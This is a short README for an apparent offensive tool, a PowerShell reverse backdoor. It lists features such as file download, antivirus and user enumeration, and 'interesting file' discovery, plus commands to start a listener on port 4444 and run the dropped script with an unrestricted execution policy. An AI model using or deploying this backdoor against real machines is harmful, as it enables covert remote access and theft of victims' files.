# powershell-backdoor
A Powershell Reverse Backdoor
<br>
![preview](preview.png)
<br>
# Features / To Do
## Features 
* Download Files from remote system
* Fetch target computers public IP address
* List local users
* Find Intresting Files
* Get OS Information
* Get BIOS Information
* Get Anti-Virus Status
* Get Active TCP Clients
* Checks for common pentesting software installed
## To Do 
* Find Writeable Directories
* Get Windows Update Status

# Setup
Don't change the code inside template.ps1, instead run listen.py
```
PS C:\Users\DrewQ\Desktop> python .\listen.py --verbose
[*] Encoding backdoor script
[*] Saved backdoor backdoor.ps1 sha1:02cf166bbe6fdf8f3db4d3e6d04e5e2cf8b98a6b
[*] Starting Backdoor Listener 192.168.0.223:4444
```
No arguments are required, backdoor.ps1 will be dropped in the current working directory.

# Execution
```cmd
powershell.exe -File backdoor.ps1 -ExecutionPolicy Unrestricted
```
```cmd
┌──(drew㉿kali)-[/home/drew/Documents]
└─PS> ./backdoor.ps1
```
